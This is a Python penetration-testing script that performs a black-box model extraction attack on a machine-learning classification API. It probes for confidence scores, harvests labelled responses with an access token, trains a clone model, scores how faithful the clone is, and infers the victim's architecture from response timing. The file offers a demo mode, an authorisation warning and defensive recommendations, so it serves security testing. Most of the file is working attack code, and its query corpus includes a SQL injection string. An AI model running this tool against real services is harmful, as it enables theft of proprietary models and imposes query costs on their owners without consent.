#!/usr/bin/env python3
"""
=============================================================================
AI VAPT — Black-Box Model Extraction Script
=============================================================================
Author  : Abdullah Riaz — Kualitatem
Version : 1.0
Ref     : OWASP LLM10 | OWASP ML05 | MITRE ATLAS AML.T0035 | CWE-200

DESCRIPTION:
    Implements a black-box model extraction attack against an ML classification
    API. By systematically querying the victim model with diverse inputs and
    collecting the corresponding outputs (labels + confidence scores), this
    script trains a substitute "clone" model that approximates the victim's
    decision boundary.

    This demonstrates:
      - Whether the API exposes sufficient information for model cloning
      - The feasibility of IP theft via query-based extraction
      - Side-channel architecture inference via timing analysis

    Attack phases:
      Phase 1 — Probe: Test if API returns confidence scores (required).
      Phase 2 — Query: Send diverse inputs; collect label/score pairs.
      Phase 3 — Train: Fit a substitute model on collected pairs.
      Phase 4 — Evaluate: Measure agreement between clone and victim.
      Phase 5 — Timing: Infer model size from response time scaling.

USAGE:
    # Text classification target (e.g., sentiment analysis)
    python3 model_extraction.py \\
        --url https://target/api/classify \\
        --token YOUR_TOKEN \\
        --task text \\
        --queries 500 \\
        --output results/model_extraction.json

    # Demo mode (no real API, uses synthetic data)
    python3 model_extraction.py --demo --task text

REQUIREMENTS:
    pip install requests numpy scikit-learn colorama

OPTIONAL (for ART-based extraction):
    pip install adversarial-robustness-toolbox

WARNING: Use only on systems you have written authorisation to test.
         Model extraction may violate the target API's Terms of Service
         in addition to causing IP theft harm.
=============================================================================
"""

import argparse
import json
import sys
import time
import random
import uuid
from datetime import datetime
from pathlib import Path

try:
    import numpy as np
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] Missing: pip install requests numpy colorama")
    sys.exit(1)

try:
    from sklearn.neural_network import MLPClassifier
    from sklearn.metrics import accuracy_score
    from sklearn.preprocessing import LabelEncoder
    from sklearn.feature_extraction.text import TfidfVectorizer
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    print(f"[!] scikit-learn not found. Install with: pip install scikit-learn")

BANNER = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════╗
║     AI VAPT — Black-Box Model Extraction                     ║
║     OWASP LLM10/ML05 | Author: Abdullah Riaz @ Kualitatem   ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ── Synthetic query corpus for text classification tasks ──────────────────────
TEXT_CORPUS = [
    # Positive sentiment examples
    "This product is absolutely fantastic, I love it!",
    "Excellent service, would highly recommend to everyone.",
    "The quality exceeded my expectations by far.",
    "Amazing experience from start to finish, five stars.",
    "I'm really happy with this purchase, great value.",
    "Outstanding performance and very reliable.",
    "Best product I've bought this year, totally worth it.",
    "Incredible results, I'm thoroughly impressed.",
    "Perfect in every way, couldn't ask for more.",
    "Great quality, fast delivery, excellent packaging.",
    # Negative sentiment examples
    "Terrible product, complete waste of money.",
    "Absolutely awful, broke after just one day.",
    "Worst purchase I've ever made, very disappointed.",
    "Poor quality, nothing like what was advertised.",
    "Do not buy this, it's a total scam.",
    "Extremely disappointed, returned it immediately.",
    "Horrible experience, customer service was useless.",
    "This product is garbage, fell apart immediately.",
    "Very disappointed, expected much better quality.",
    "Avoid at all costs, completely useless.",
    # Neutral examples
    "The product arrived as described, nothing special.",
    "It works fine, but nothing remarkable about it.",
    "Average quality for the price, meets basic needs.",
    "Decent product, does what it's supposed to do.",
    "OK product, neither great nor terrible.",
    "Standard quality, no complaints but no praise.",
    "The item is acceptable, not outstanding.",
    "Fairly mediocre, expected more for the price.",
    "It's okay, gets the job done but nothing more.",
    "Middle of the road, average in every way.",
    # Technical content (for code/spam classifiers)
    "SELECT * FROM users WHERE username='admin'--",
    "Hello! You've won $1,000,000! Click here to claim.",
    "def authenticate(username, password): return db.query(username)",
    "URGENT: Your account has been compromised. Act now!",
    "import requests; r = requests.get('http://example.com')",
    "Free offer! Limited time only! No strings attached!",
    "The server configuration uses nginx with SSL termination.",
    "Buy now! Lowest prices guaranteed! Only today!",
    "Exception thrown at line 42: NullPointerException",
    "Congratulations! You are our lucky winner today!",
]


def probe_api_capability(url, token, field, response_field, extra_headers, timeout):
    """
    Test what information the API returns — label only or label + confidence.
    Returns: ('label_only' | 'with_confidence' | 'error', sample_response)
    """
    print(f"\n{Fore.CYAN}[*] Probing API capabilities...{Style.RESET_ALL}")
    headers = {"Content-Type": "application/json",
               "Authorization": f"Bearer {token}", **extra_headers}

    test_text = "This is a great product, highly recommended!"
    try:
        resp = requests.post(url, headers=headers,
                             json={field: test_text, "return_probabilities": True,
                                   "return_all_scores": True},
                             timeout=timeout)
        data = resp.json()
        print(f"  HTTP Status     : {resp.status_code}")
        print(f"  Response Sample : {json.dumps(data)[:200]}")

        has_scores = any([
            "scores" in data and isinstance(data["scores"], dict),
            "confidence" in data and isinstance(data["confidence"], (int, float)),
            "probabilities" in data and isinstance(data["probabilities"], list),
        ])

        if has_scores:
            print(f"  {Fore.GREEN}[+] API returns confidence scores — extraction is FEASIBLE{Style.RESET_ALL}")
            return "with_confidence", data
        else:
            print(f"  {Fore.YELLOW}[!] API returns label only — extraction is HARDER (no confidence scores){Style.RESET_ALL}")
            return "label_only", data
    except Exception as e:
        print(f"  {Fore.RED}[!] API probe failed: {e}{Style.RESET_ALL}")
        return "error", {}


def query_victim(url, token, text, field, response_field, extra_headers, timeout):
    """Query victim model and return (label, confidence_score, response_time_ms)."""
    headers = {"Content-Type": "application/json",
               "Authorization": f"Bearer {token}", **extra_headers}
    try:
        start = time.time()
        resp = requests.post(url, headers=headers,
                             json={field: text, "return_probabilities": True},
                             timeout=timeout)
        elapsed_ms = int((time.time() - start) * 1000)
        data = resp.json()

        # Extract label
        label = (data.get("label") or data.get("class") or
                 data.get("prediction") or data.get(response_field, "unknown"))
        if isinstance(label, dict):
            label = str(label)

        # Extract confidence
        confidence = -1.0
        if "scores" in data and isinstance(data["scores"], dict):
            confidence = max(data["scores"].values())
        elif "confidence" in data:
            confidence = float(data["confidence"])
        elif "probabilities" in data:
            confidence = max(data["probabilities"])

        return str(label), confidence, elapsed_ms
    except Exception as e:
        return "error", -1.0, 0


def run_timing_analysis(url, token, field, extra_headers, timeout):
    """
    Analyse response time vs input length to infer model architecture.
    Transformers scale O(n²) with input length; simpler models scale O(n).
    """
    print(f"\n{Fore.CYAN}[*] Running timing analysis for architecture inference...{Style.RESET_ALL}")

    test_lengths = [10, 50, 100, 200, 400, 800]
    timing_results = []

    headers = {"Content-Type": "application/json",
               "Authorization": f"Bearer {token}", **extra_headers}

    for length in test_lengths:
        text = "word " * length  # Simple repeating text of known length
        times = []
        for _ in range(3):  # 3 trials per length
            try:
                start = time.time()
                requests.post(url, headers=headers,
                              json={field: text}, timeout=timeout)
                times.append((time.time() - start) * 1000)
                time.sleep(0.2)
            except Exception:
                pass

        if times:
            avg_time = np.mean(times)
            timing_results.append((length * 5, avg_time))  # chars, ms
            print(f"  Input: {length*5:5d} chars | Avg response: {avg_time:7.1f}ms")

    if len(timing_results) >= 3:
        chars = np.array([t[0] for t in timing_results])
        times = np.array([t[1] for t in timing_results])

        # Fit linear model (log-log) to determine scaling exponent
        log_chars = np.log(chars + 1)
        log_times = np.log(times + 1)
        slope = np.polyfit(log_chars, log_times, 1)[0]

        print(f"\n  Scaling exponent: {slope:.2f}")
        if slope > 1.5:
            arch_hint = "Transformer/Attention-based (O(n²)) — consistent with BERT/GPT architecture"
            c = Fore.YELLOW
        elif 0.8 < slope <= 1.5:
            arch_hint = "Linear scaling — consistent with simpler ML model (SVM, logistic regression, smaller LSTM)"
            c = Fore.GREEN
        else:
            arch_hint = "Sub-linear scaling — possible caching or very simple model"
            c = Fore.CYAN
        print(f"  {c}Architecture hint: {arch_hint}{Style.RESET_ALL}")
        return timing_results, slope, arch_hint
    return timing_results, None, "Insufficient data"


def generate_demo_responses(texts):
    """Simulate victim model responses for demo mode."""
    responses = []
    for text in texts:
        tl = text.lower()
        if any(w in tl for w in ["great", "excellent", "amazing", "fantastic",
                                   "wonderful", "best", "love", "outstanding"]):
            label, conf = "positive", round(random.uniform(0.85, 0.98), 4)
        elif any(w in tl for w in ["terrible", "awful", "worst", "horrible",
                                    "garbage", "disappointed", "avoid", "scam"]):
            label, conf = "negative", round(random.uniform(0.82, 0.97), 4)
        else:
            label, conf = "neutral", round(random.uniform(0.60, 0.80), 4)
        responses.append((label, conf, random.randint(80, 250)))
    return responses


def train_clone_model(texts, labels, confidences):
    """Train a substitute MLP model on the collected query-label pairs."""
    if not SKLEARN_AVAILABLE:
        print(f"{Fore.RED}[!] scikit-learn required: pip install scikit-learn{Style.RESET_ALL}")
        return None, None, None

    vectorizer = TfidfVectorizer(max_features=5000, ngram_range=(1, 2))
    X = vectorizer.fit_transform(texts)

    le = LabelEncoder()
    y = le.fit_transform(labels)

    clone = MLPClassifier(
        hidden_layer_sizes=(256, 128, 64),
        activation="relu",
        max_iter=500,
        random_state=42,
        early_stopping=True,
        validation_fraction=0.1,
        verbose=False,
    )
    clone.fit(X, y)
    return clone, vectorizer, le


def evaluate_clone(clone, vectorizer, le, eval_texts, eval_labels):
    """Measure clone model agreement with victim labels."""
    if clone is None or not eval_texts:
        return 0.0

    X_eval = vectorizer.transform(eval_texts)
    y_true = le.transform([l for l in eval_labels
                            if l in le.classes_])
    # Filter to only labels seen during training
    valid_idx = [i for i, l in enumerate(eval_labels) if l in le.classes_]
    if not valid_idx:
        return 0.0

    X_eval_valid = vectorizer.transform([eval_texts[i] for i in valid_idx])
    y_true_valid = le.transform([eval_labels[i] for i in valid_idx])
    y_pred = clone.predict(X_eval_valid)
    return accuracy_score(y_true_valid, y_pred)


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="AI VAPT — Black-Box Model Extraction (OWASP LLM10/ML05)"
    )
    parser.add_argument("--url",            required=False, default=None)
    parser.add_argument("--token",          required=False, default="DEMO_TOKEN")
    parser.add_argument("--field",          default="text")
    parser.add_argument("--response-field", default="label")
    parser.add_argument("--task",           default="text",
                        choices=["text", "image"],
                        help="Type of classification task (default: text)")
    parser.add_argument("--queries",        type=int, default=200,
                        help="Number of queries to send to the victim (default: 200)")
    parser.add_argument("--output",         default="results/model_extraction.json")
    parser.add_argument("--timeout",        type=int, default=30)
    parser.add_argument("--delay",          type=float, default=0.3)
    parser.add_argument("--header",         action="append", default=[], metavar="KEY:VALUE")
    parser.add_argument("--demo",           action="store_true",
                        help="Run in demo mode with synthetic data (no real API calls)")
    parser.add_argument("--timing",         action="store_true",
                        help="Run timing analysis for architecture inference")
    args = parser.parse_args()

    if not args.demo and not args.url:
        print(f"{Fore.RED}[!] --url required unless --demo specified{Style.RESET_ALL}")
        sys.exit(1)

    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    # ── Phase 1: Probe API ────────────────────────────────────────────────────
    print(f"\n{Fore.CYAN}{'═' * 66}")
    print(f"  PHASE 1 — API CAPABILITY PROBE")
    print(f"{'═' * 66}{Style.RESET_ALL}")

    if args.demo:
        print(f"  {Fore.YELLOW}DEMO MODE — simulating API with synthetic responses{Style.RESET_ALL}")
        api_capability = "with_confidence"
    else:
        api_capability, _ = probe_api_capability(
            args.url, args.token, args.field, args.response_field,
            extra_headers, args.timeout
        )
        if api_capability == "error":
            print(f"{Fore.RED}[!] Cannot reach target API. Check URL and token.{Style.RESET_ALL}")
            sys.exit(1)

    # ── Phase 2: Query Collection ─────────────────────────────────────────────
    print(f"\n{Fore.CYAN}{'═' * 66}")
    print(f"  PHASE 2 — QUERY COLLECTION ({args.queries} queries)")
    print(f"{'═' * 66}{Style.RESET_ALL}")

    # Build query set (cycle corpus to reach desired query count)
    random.seed(42)
    query_texts = []
    while len(query_texts) < args.queries:
        shuffled = TEXT_CORPUS.copy()
        random.shuffle(shuffled)
        query_texts.extend(shuffled)
    query_texts = query_texts[:args.queries]

    collected_texts, collected_labels, collected_confidences = [], [], []
    response_times = []
    errors = 0

    print(f"  Querying victim model... (delay: {args.delay}s)\n")

    for i, text in enumerate(query_texts, 1):
        if args.demo:
            label, conf, rtime = generate_demo_responses([text])[0]
        else:
            label, conf, rtime = query_victim(
                args.url, args.token, text,
                args.field, args.response_field,
                extra_headers, args.timeout
            )
            time.sleep(args.delay)

        if label == "error":
            errors += 1
            continue

        collected_texts.append(text)
        collected_labels.append(label)
        collected_confidences.append(conf)
        response_times.append(rtime)

        if i % 25 == 0 or i == args.queries:
            unique_labels = len(set(collected_labels))
            avg_conf = np.mean([c for c in collected_confidences if c > 0]) if collected_confidences else 0
            print(f"  [{i:4d}/{args.queries}] Collected: {len(collected_texts)} | "
                  f"Labels seen: {unique_labels} | "
                  f"Avg confidence: {avg_conf:.3f} | "
                  f"Errors: {errors}")

    print(f"\n  {Fore.GREEN}Collection complete!{Style.RESET_ALL}")
    print(f"  Total queries   : {args.queries}")
    print(f"  Successful      : {len(collected_texts)}")
    print(f"  Errors          : {errors}")
    print(f"  Unique labels   : {list(set(collected_labels))}")
    print(f"  Avg response    : {np.mean(response_times):.1f}ms")
    if collected_confidences and any(c > 0 for c in collected_confidences):
        valid_conf = [c for c in collected_confidences if c > 0]
        print(f"  Avg confidence  : {np.mean(valid_conf):.4f}")

    # Estimate API cost (assuming ~$0.002 per 1K tokens, ~50 tokens avg per query)
    est_cost = (len(collected_texts) * 50 / 1000) * 0.002
    print(f"  Est. API cost   : ${est_cost:.4f} (to target organisation)")

    # ── Phase 3: Clone Training ────────────────────────────────────────────────
    print(f"\n{Fore.CYAN}{'═' * 66}")
    print(f"  PHASE 3 — CLONE MODEL TRAINING")
    print(f"{'═' * 66}{Style.RESET_ALL}")

    if not SKLEARN_AVAILABLE:
        print(f"  {Fore.RED}[!] scikit-learn not available. Skipping clone training.{Style.RESET_ALL}")
        clone = vectorizer = le = None
        clone_accuracy = 0.0
    else:
        # Split: 80% train, 20% evaluation
        split = int(len(collected_texts) * 0.8)
        train_texts, eval_texts   = collected_texts[:split], collected_texts[split:]
        train_labels, eval_labels = collected_labels[:split], collected_labels[split:]

        print(f"  Training MLP substitute model on {len(train_texts)} samples...")
        print(f"  Architecture: MLP (256, 128, 64) | TF-IDF features (max 5000)")

        clone, vectorizer, le = train_clone_model(
            train_texts, train_labels, collected_confidences[:split]
        )

        if clone and eval_texts:
            clone_accuracy = evaluate_clone(clone, vectorizer, le, eval_texts, eval_labels)
            print(f"\n  {Fore.YELLOW}Clone model fidelity (agreement with victim):{Style.RESET_ALL}")
            print(f"  Evaluation samples : {len(eval_texts)}")
            print(f"  Agreement rate     : {clone_accuracy:.1%}")

            if clone_accuracy >= 0.90:
                print(f"  {Fore.RED}[CRITICAL] >90% fidelity — model successfully cloned!{Style.RESET_ALL}")
                print(f"  {Fore.RED}           Attacker now has a local replica of the victim model.{Style.RESET_ALL}")
            elif clone_accuracy >= 0.75:
                print(f"  {Fore.YELLOW}[HIGH] 75-90% fidelity — partial model extraction achieved.{Style.RESET_ALL}")
            else:
                print(f"  {Fore.GREEN}[LOW] <75% fidelity — extraction not highly successful.{Style.RESET_ALL}")
        else:
            clone_accuracy = 0.0

    # ── Phase 4: Timing Analysis (Optional) ──────────────────────────────────
    arch_hint = "Not performed"
    if args.timing and not args.demo:
        print(f"\n{Fore.CYAN}{'═' * 66}")
        print(f"  PHASE 4 — TIMING ANALYSIS (Architecture Inference)")
        print(f"{'═' * 66}{Style.RESET_ALL}")
        _, scaling_exp, arch_hint = run_timing_analysis(
            args.url, args.token, args.field, extra_headers, args.timeout
        )

    # ── Save Report ────────────────────────────────────────────────────────────
    path = Path(args.output)
    path.parent.mkdir(parents=True, exist_ok=True)

    report = {
        "metadata": {
            "tool": "AI VAPT — Model Extraction Attack",
            "author": "Abdullah Riaz — Kualitatem",
            "owasp_refs": ["OWASP LLM10", "OWASP ML05"],
            "mitre_atlas": "AML.T0035",
            "target": args.url if not args.demo else "DEMO_MODE",
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "demo_mode": args.demo,
        },
        "query_phase": {
            "total_queries": args.queries,
            "successful": len(collected_texts),
            "errors": errors,
            "unique_labels": list(set(collected_labels)),
            "avg_response_time_ms": float(np.mean(response_times)) if response_times else 0,
            "api_capability": api_capability,
            "estimated_cost_usd": round(est_cost, 4),
        },
        "clone_model": {
            "trained": clone is not None,
            "fidelity_accuracy": round(clone_accuracy, 4),
            "vulnerability": (
                "CRITICAL" if clone_accuracy >= 0.90 else
                "HIGH" if clone_accuracy >= 0.75 else
                "MEDIUM" if clone_accuracy >= 0.60 else "LOW"
            ),
        },
        "architecture_inference": arch_hint,
        "recommendations": [
            "Remove confidence scores / probability values from public API responses — return only class labels.",
            "Implement rate limiting per user (100 requests/hour) to prevent large-scale query collection.",
            "Add output perturbation: inject small calibrated noise into confidence values.",
            "Monitor for systematic query patterns (sequential inputs, high-frequency identical-format queries).",
            "Use model watermarking to detect if a cloned model is derived from your API.",
            "Implement query logging and anomaly detection for extraction pattern identification.",
        ],
    }

    with open(path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n{Fore.CYAN}[*] Report saved: {args.output}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Run with --demo to test the workflow without a real API.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Add --timing flag to perform architecture inference via timing analysis.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
